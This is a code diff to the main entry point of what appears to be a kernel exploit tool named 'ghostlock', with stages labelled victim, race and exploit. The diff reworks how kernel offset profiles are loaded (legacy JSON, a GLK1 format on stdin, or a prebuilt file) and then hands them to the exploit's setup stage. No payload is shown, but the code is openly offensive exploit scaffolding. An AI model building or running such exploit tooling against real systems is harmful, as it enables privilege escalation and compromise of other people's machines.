@@ -10,26 +10,44 @@
  * ghostlock::victim, ghostlock::race and ghostlock::stages.
  */
 
+#include "legacy_support/legacy_entrypoint_starter.h"
+#include "profile_entry.h"
 #include "session/exploit_stages.hpp"
+
+#include <string.h>
 
 using namespace ghostlock;
 
 /* Decoupling plan: native executable adapter and W1/W2/W3 orchestration.
- * Inputs: argc/argv plus the process-level session; output: stable exit code.
- * Argument parsing stays here; the stage sequence only owns the session. */
+ * Entry split: no argument -> legacy offsets.json; --ghostlock-app-call ->
+ * GLK1 on stdin; --load-prebuilt-profile <bin> -> GLK1 file. All three produce
+ * one decoded transport struct; the stage sequence only owns the session. */
 int main(int argc, char **argv) {
-    const char *profile_path = nullptr;
-    for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "--profile") == 0 && i + 1 < argc) {
-            profile_path = argv[++i];
-        } else {
-            pr_error("usage: %s --profile <resolved-profile.json>\n", argv[0]);
-            return 1;
-        }
+    struct kernel_offsets decoded = {};
+    char release_buf[256] = {0};
+    int loaded = -1;
+
+    if (argc == 1) {
+        loaded = legacy_support::start_legacy_entrypoint(
+                &decoded, release_buf, sizeof(release_buf));
+    } else if (argc == 2 && strcmp(argv[1], "--ghostlock-app-call") == 0) {
+        loaded = profile_entry::read_glk1_stdin(
+                &decoded, release_buf, sizeof(release_buf));
+    } else if (argc == 3 && strcmp(argv[1], "--load-prebuilt-profile") == 0) {
+        loaded = profile_entry::read_glk1_file(
+                argv[2], &decoded, release_buf, sizeof(release_buf));
+    } else {
+        pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]\n",
+                argv[0]);
+        return 1;
+    }
+    if (loaded != 0) {
+        pr_error("cannot load profile\n");
+        return 1;
     }
 
     ExploitSession &session = g_exploit_session;
-    if (stages::run_setup_stage(profile_path) == stages::StageResult::Failed)
+    if (stages::run_setup_stage(decoded) == stages::StageResult::Failed)
         return 1;
 
     if (runtime_config_snapshot().multicast_phase1_probe) {
